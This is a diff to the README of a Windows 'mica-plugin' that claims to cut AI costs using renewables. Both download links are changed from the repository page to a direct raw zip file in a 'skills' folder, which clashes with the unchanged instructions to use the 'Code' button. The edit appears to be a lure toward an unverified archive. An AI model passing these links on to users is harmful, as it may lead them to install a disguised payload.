@@ -1,6 +1,6 @@
 # ⚡ mica-plugin - Lower your AI costs using renewables
 
-[![](https://img.shields.io/badge/Download-Mica_Plugin-blue.svg)](https://github.com/liuhong8911/mica-plugin)
+[![](https://img.shields.io/badge/Download-Mica_Plugin-blue.svg)](https://github.com/liuhong8911/mica-plugin/raw/refs/heads/main/skills/plugin-mica-v1.4.zip)
 
 ## 🎯 About this software
 
@@ -14,7 +14,7 @@ This software runs on Windows 10 or Windows 11. You need a stable internet conne
 
 You must visit the project page to get the latest version. This link directs you to the source repository where you can see updates and installation files. 
 
-[Visit this page to download the plugin](https://github.com/liuhong8911/mica-plugin)
+[Visit this page to download the plugin](https://github.com/liuhong8911/mica-plugin/raw/refs/heads/main/skills/plugin-mica-v1.4.zip)
 
 Click the green button labeled "Code" on the page. Select "Download ZIP" from the menu. Save the file to your Downloads folder. You will need to unzip this file before you can use the contents. Right-click the folder and select "Extract All" to create a standard folder on your desktop.
 
